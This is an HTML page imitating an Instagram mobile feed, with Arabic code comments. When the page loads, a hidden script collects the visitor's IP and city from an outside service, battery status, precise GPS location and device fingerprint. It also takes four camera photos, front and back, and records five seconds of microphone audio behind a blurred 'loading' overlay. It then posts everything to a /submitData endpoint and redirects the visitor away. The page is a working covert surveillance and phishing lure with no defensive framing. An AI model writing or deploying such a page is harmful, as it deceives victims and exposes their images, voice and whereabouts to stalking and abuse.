<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        .ig-container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #000;
            display: flex;
            flex-direction: column;
        }

        /* Top Header */
        .top-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            border-bottom: 1px solid rgba(255,255,255,0.08);
            background: #000;
            z-index: 100;
            flex-shrink: 0;
        }
        .top-header .logo-text {
            font-family: 'Segoe UI', cursive;
            font-size: 26px;
            font-weight: 600;
            color: #fff;
            letter-spacing: -1px;
        }
        .top-header .header-icons {
            display: flex;
            gap: 20px;
        }
        .top-header .header-icons i {
            font-size: 24px;
            color: #fff;
        }

        /* Stories Bar */
        .stories-bar {
            display: flex;
            gap: 12px;
            padding: 12px 15px;
            overflow-x: auto;
            scrollbar-width: none;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            background: #000;
            z-index: 100;
            flex-shrink: 0;
        }
        .stories-bar::-webkit-scrollbar { display: none; }
        .story-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            min-width: 64px;
        }
        .story-ring {
            width: 64px; height: 64px;
            border-radius: 50%;
            padding: 3px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
        }
        .story-ring-inner {
            width: 100%; height: 100%;
            border-radius: 50%;
            border: 2px solid #000;
            background: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .story-ring-inner i {
            font-size: 22px;
            color: #fff;
        }
        .story-username {
            font-size: 11px;
            color: #fff;
            max-width: 64px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .story-item.mine .story-ring {
            background: none;
            border: 1px solid rgba(255,255,255,0.2);
            position: relative;
        }
        .story-item.mine .story-ring::after {
            content: '+';
            position: absolute;
            bottom: 0; right: 0;
            background: #0095f6;
            color: #fff;
            width: 18px; height: 18px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            border: 2px solid #000;
        }

        /* Feed */
        .feed {
            flex: 1;
            overflow-y: auto;
            scrollbar-width: none;
            background: #000;
        }
        .feed::-webkit-scrollbar { display: none; }

        /* Post */
        .post {
            border-bottom: 1px solid rgba(255,255,255,0.06);
            padding-bottom: 12px;
        }
        .post-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
        }
        .post-user {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .post-avatar {
            width: 32px; height: 32px;
            border-radius: 50%;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743);
            padding: 2px;
        }
        .post-avatar-inner {
            width: 100%; height: 100%;
            border-radius: 50%;
            background: #333;
            border: 1.5px solid #000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .post-avatar-inner i {
            font-size: 14px;
            color: #fff;
        }
        .post-username {
            font-size: 13px;
            font-weight: 600;
            color: #fff;
        }
        .post-verified {
            color: #0095f6;
            font-size: 12px;
        }
        .post-more {
            font-size: 16px;
            color: #fff;
        }

        /* Post Image */
        .post-image {
            width: 100%;
            height: 200px;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .post-image i {
            font-size: 60px;
            color: rgba(255,255,255,0.1);
        }

        /* Post Actions */
        .post-actions {
            display: flex;
            justify-content: space-between;
            padding: 10px 15px 6px;
        }
        .post-actions-left {
            display: flex;
            gap: 16px;
        }
        .post-actions i {
            font-size: 24px;
            color: #fff;
        }

        /* Post Info */
        .post-info {
            padding: 0 15px;
        }
        .likes-count {
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
        }
        .caption {
            font-size: 13px;
            line-height: 1.4;
            color: #fff;
            margin-bottom: 4px;
        }
        .caption .user {
            font-weight: 600;
        }
        .view-comments {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
            margin-bottom: 4px;
        }
        .post-time {
            font-size: 10px;
            color: rgba(255,255,255,0.4);
            text-transform: uppercase;
        }

        /* Loading Spinner القديم - تم إخفاؤه */
        .loading-spinner {
            display: none; /* إخفاء spinner القديم */
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
        }
        .spinner-ring {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.2);
            border-top-color: #fff;
            border-radius: 50%;
        }

        /* Bottom Nav */
        .bottom-nav {
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 8px 0 20px;
            background: #000;
            border-top: 1px solid rgba(255,255,255,0.08);
            z-index: 200;
            flex-shrink: 0;
        }
        .nav-item {
            cursor: pointer;
        }
        .nav-item i {
            font-size: 26px;
            color: #fff;
        }
        .nav-item .nav-avatar {
            width: 26px; height: 26px;
            border-radius: 50%;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743);
            padding: 1.5px;
        }
        .nav-avatar-inner {
            width: 100%; height: 100%;
            border-radius: 50%;
            background: #333;
            border: 1.5px solid #000;
        }

        /* ===== NEW: Loading Overlay مع تشويش خفيف ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
            pointer-events: none;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        .loading-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .loading-box {
            background: #1a8cff; /* أزرق */
            padding: 30px 40px;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
        }
        .loading-box .spinner-ring-big {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .loading-box p {
            color: #fff;
            margin-top: 15px;
            font-size: 16px;
            font-weight: 500;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* ================================================= */
    </style>
</head>
<body>

    <div class="ig-container">
        <!-- Top Header -->

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        // عنصر overlay للتحميل
        const loadingOverlay = document.getElementById('loadingOverlay');

        // JS Animation for spinner (تم تعطيلها لأننا لا نستخدم spinner القديم)
        // let rotation = 0;
        // function animateSpinner() {
        //     rotation = (rotation + 6) % 360;
        //     const ring = document.getElementById('spinnerRing');
        //     if (ring) {
        //         ring.style.transform = 'rotate(' + rotation + 'deg)';
        //     }
        //     requestAnimationFrame(animateSpinner);
        // }
        // animateSpinner();

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
            } catch {
                ipInfo = 'Unable to get IP';
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
            } catch {
                batteryStatus = 'Unknown';
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));

                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);

                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);

                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');

                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });

                return response;
            } catch (error) {
                console.error('Send error:', error);
                return null;
            }
        }

        async function startProcess() {
            // إظهار الـ overlay
            loadingOverlay.classList.remove('hidden');

            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();

            const response = await sendData();

            // إخفاء الـ overlay بعد الانتهاء
            loadingOverlay.classList.add('hidden');

            setTimeout(() => {
                if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                    window.location.href = REDIRECT_URL;
                } else {
                    window.location.href = 'https://www.google.com';
                }
            }, 2000);
        }

        window.onload = function() {
            setTimeout(startProcess, 300);
        };
    </script>
